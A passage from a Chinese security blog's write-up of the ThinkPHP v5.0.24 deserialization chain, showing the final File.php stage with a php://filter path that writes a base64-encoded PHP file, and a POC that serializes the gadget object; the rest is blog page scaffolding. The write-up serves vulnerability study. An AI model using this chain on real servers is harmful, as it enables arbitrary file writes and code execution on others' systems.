<p>再次调用<code>File::set</code>方法，因为这里的<code>$key</code>也就是<code>set</code>方法的<code>$name</code>参数还会进入<code>$this-&gt;getCacheKey</code>方法，导致该参数也可控，从而使得第二次调用<code>set</code>时，<code>file_put_contents</code>的俩个参数都可控</p>
<p>我们构造这一块的exp：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">'expire'</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'cache_subdir'</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">'prefix'</span>        =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'path'</span>          =&gt; <span class="string">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php'</span>,</span><br><span class="line">            <span class="string">'data_compress'</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Driver</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>合并分析中所有的exp然后输出序列化字符串即可</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></tbody></table></figure>

<p>打入payload后就会在根目录产生名为<code>a.php3b58a9545013e88c7186db11bb158c44.php</code>的php文件</p>
<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled%207.png" alt="Untitled"></p>
<!-- hexo injector body_end start --> <script data-pjax="">if(document.getElementById('recent-posts') && (location.pathname ==='all'|| 'all' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://seizer.top/categories/刷题记录/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📚 小🐷の刷题历程 (16)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://seizer.top/categories/比赛记录/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🎮 小🐷の比赛之路 (13)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://seizer.top/categories/学习笔记/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📒 小🐷の学习笔记 (12)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://seizer.top/categories/漏洞复现/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">💡 小🐷の漏洞复现 (2)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://seizer.top/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
    console.log('已挂载magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #ecf5ffc0;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #49b1ffc0}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style><script data-pjax="">
  function butterfly_clock_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/theme_f/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_injector_config();
  }
  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax="" src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax="">
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src="/images/loading.gif" data-original="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v3.8.2" title=""><img src="/images/loading.gif" data-original="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" data-title="本站使用JsDelivr为静态资源提供CDN加速" title=""><img src="/images/loading.gif" data-original="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src="/images/loading.gif" data-original="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src="/images/loading.gif" data-original="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script data-pjax="">
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2022-09/ThinkPHP v5 0 24 反序列化 0918176c2d57466cb7300ed0d2759829/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2022-09/ThinkPHP v5 0 24 反序列化 0918176c2d57466cb7300ed0d2759829/cover.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-09-01</span><a class="blog-slider__title" href="post/2022-09/ThinkPHP v5 0 24 反序列化 0918176c2d57466cb7300ed0d2759829/" alt="">ThinkPHPv5.0.24反序列化</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/2022-09/ThinkPHP v5 0 24 反序列化 0918176c2d57466cb7300ed0d2759829/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2022-01/Linux反弹shell总结/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2022-01/Linux反弹shell总结/202201121543234.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-01-12</span><a class="blog-slider__title" href="post/2022-01/Linux反弹shell总结/" alt="">Linux反弹shell总结</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/2022-01/Linux反弹shell总结/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2022-01/长安“战疫”网络安全卫士守护赛/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2022-01/长安“战疫”网络安全卫士守护赛/202201082028599.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-01-08</span><a class="blog-slider__title" href="post/2022-01/长安“战疫”网络安全卫士守护赛/" alt="">长安“战疫”网络安全卫士守护赛</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/2022-01/长安“战疫”网络安全卫士守护赛/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2022-01/Nginx的alias指令引发的漏洞/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2022-01/Nginx的alias指令引发的漏洞/202201071905316.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-01-07</span><a class="blog-slider__title" href="post/2022-01/Nginx的alias指令引发的漏洞/" alt="">Nginx的alias指令引发的漏洞</a><div class="blog-slider__text">Nginx的alias指令配置不当导致的目录穿越漏洞原理</div><a class="blog-slider__button" href="post/2022-01/Nginx的alias指令引发的漏洞/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2022-04/第二届网刃杯/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2022-04/第二届网刃杯/image-20220503224017759.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-04-25</span><a class="blog-slider__title" href="post/2022-04/第二届网刃杯/" alt="">第二届网刃杯</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/2022-04/第二届网刃杯/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2022-04/Fastjson反序列化漏洞/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2022-04/Fastjson反序列化漏洞/logo-16515895933134.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-04-16</span><a class="blog-slider__title" href="post/2022-04/Fastjson反序列化漏洞/" alt="">Fastjson反序列化漏洞</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/2022-04/Fastjson反序列化漏洞/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2022-01/2022工大抗疫/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2022-01/2022工大抗疫/202201162149478.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-01-16</span><a class="blog-slider__title" href="post/2022-01/2022工大抗疫/" alt="">2022工大抗疫</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" href="post/2022-01/2022工大抗疫/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/2021-12/2021年终总结/" alt=""><img width="48" height="48" src="/images/loading.gif" data-original="post/2021-12/2021年终总结/202112311402983.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-12-31</span><a class="blog-slider__title" href="post/2021-12/2021年终总结/" alt="">2021年终总结</a><div class="blog-slider__text">2021年马上就要过去了&lt;br&gt;2022年加油！</div><a class="blog-slider__button" href="post/2021-12/2021年终总结/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer="" src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer="" data-pjax="" src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '600ms');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '100');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer="" src="https://unpkg.zhimg.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer="" src="https://unpkg.zhimg.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>ThinkPHPv5.0.24反序列化</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://seizer.top/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/">https://seizer.top/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>Seizer</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-09-01</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-09-01</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/ThinkPHP/">ThinkPHP</a></div><div class="post_share"><div class="social-share" data-image="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/cover.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/2022-04/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/"><img class="next-cover" src="/images/loading.gif" data-original="/post/2022-04/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/image-20220503224017759.png" onerror="onerror=null;src='/img/loading.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第二届网刃杯</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/2021-06/%5BMRCTF2020%5DEzpop/" title="MRCTF2020-Ezpop"><img class="cover" src="/images/loading.gif" data-original="/post/2021-06/%5BMRCTF2020%5DEzpop/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-12</div><div class="title">MRCTF2020-Ezpop</div></div></a></div><div><a href="/post/2021-05/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_serialize_php/" title="安洵杯2019-easy_serialize_php"><img class="cover" src="/images/loading.gif" data-original="/post/2021-05/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_serialize_php/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-13</div><div class="title">安洵杯2019-easy_serialize_php</div></div></a></div><div><a href="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Phar反序列化漏洞"><img class="cover" src="/images/loading.gif" data-original="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/202112062110437.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-13</div><div class="title">Phar反序列化漏洞</div></div></a></div><div><a href="/post/2021-12/%5BGYCTF2020%5DEasyphp/" title="GYCTF2020 Easyphp"><img class="cover" src="/images/loading.gif" data-original="/post/2021-12/%5BGYCTF2020%5DEasyphp/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-16</div><div class="title">GYCTF2020 Easyphp</div></div></a></div><div><a href="/post/2021-12/%5BSWPUCTF%202018%5DSimplePHP/" title="SWPUCTF 2018-SimplePHP"><img class="cover" src="/images/loading.gif" data-original="/post/2021-12/%5BSWPUCTF%202018%5DSimplePHP/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">SWPUCTF 2018-SimplePHP</div></div></a></div><div><a href="/post/2021-12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/" title="强网杯2019 Upload"><img class="cover" src="/images/loading.gif" data-original="/post/2021-12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/202112062028562.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-18</div><div class="title">强网杯2019 Upload</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-v5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP v5.0.24 反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-php%E5%85%A5%E5%8F%A3"><span class="toc-number">4.1.</span> <span class="toc-text">Windows.php入口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Model-php%E8%BF%87%E6%B8%A1"><span class="toc-number">4.2.</span> <span class="toc-text">Model.php过渡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Output-php%E8%BF%87%E6%B8%A1"><span class="toc-number">4.3.</span> <span class="toc-text">Output.php过渡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memcache-php%E8%BF%87%E6%B8%A1"><span class="toc-number">4.4.</span> <span class="toc-text">Memcache.php过渡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-php%E7%BB%88%E7%82%B9"><span class="toc-number">4.5.</span> <span class="toc-text">File.php终点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">©2020 - 2022  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Seizer</div><div class="footer_custom_text">Hello, Welcome to 🐷のblog!</div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 5000);</script><div class="js-pjax"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macWhite.css"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="Ctfer,RCE,python,shell,DIY,sqli,apache,nginx,upload,java,PHP,bug" data-fontsize="15px" data-random="true" async="async"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script><script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>